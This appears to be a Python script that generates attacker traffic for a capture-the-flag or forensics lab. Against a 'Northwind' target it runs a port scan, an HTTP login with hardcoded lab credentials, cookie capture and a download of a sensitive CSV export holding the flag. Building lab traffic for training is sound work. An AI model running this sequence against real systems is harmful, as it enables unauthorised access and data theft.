#!/usr/bin/env python3
"""Atacante que ejecuta el kill chain completo contra el target de Northwind:
1) recon (escaneo de puertos), 2) credential access (login HTTP en claro),
3) collection + exfil (descarga del export sensible con la flag). Todo en un PCAP."""
import os
import socket
import time
import urllib.request

TARGET = os.environ.get("TARGET", "target")
START_DELAY = int(os.environ.get("START_DELAY", "6"))
USER = os.environ.get("APP_USER", "svc_report")
PASS = os.environ.get("APP_PASS", "Rep0rt-Sync-2026")
BASE = f"http://{TARGET}:80"


def log(m):
    print(m, flush=True)


def main():
    time.sleep(START_DELAY)
    for _ in range(40):
        try:
            with socket.create_connection((TARGET, 80), timeout=2):
                break
        except OSError:
            time.sleep(1)

    # FASE 1 — recon: escaneo de puertos
    log("[attacker] FASE 1 recon: escaneo de puertos")
    for p in (22, 80, 443, 3306, 8080, 9000):
        try:
            s = socket.create_connection((TARGET, p), timeout=1)
            s.recv(64)
            s.close()
        except OSError:
            pass
        time.sleep(0.2)

    # FASE 2 — credential access: login HTTP en claro
    log(f"[attacker] FASE 2 cred-access: login como {USER}")
    body = urllib.parse.urlencode({"username": USER, "password": PASS}).encode()
    req = urllib.request.Request(BASE + "/login", data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    with urllib.request.urlopen(req, timeout=5) as r:
        r.read()
        cookie = r.headers.get("Set-Cookie", "")
    sid = cookie.split("SID=")[1].split(";")[0] if "SID=" in cookie else ""
    log(f"[attacker]   sesion SID={sid}")

    # FASE 3 — collection + exfil: descarga del export sensible
    log("[attacker] FASE 3 exfil: descarga del export sensible")
    req2 = urllib.request.Request(BASE + "/admin/export.csv", headers={"Cookie": f"SID={sid}"})
    with urllib.request.urlopen(req2, timeout=5) as r:
        data = r.read()
    log(f"[attacker]   export.csv descargado ({len(data)} bytes)")
    log("[attacker] kill chain completo. Fin.")
    open("/tmp/session_done", "w").close()
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
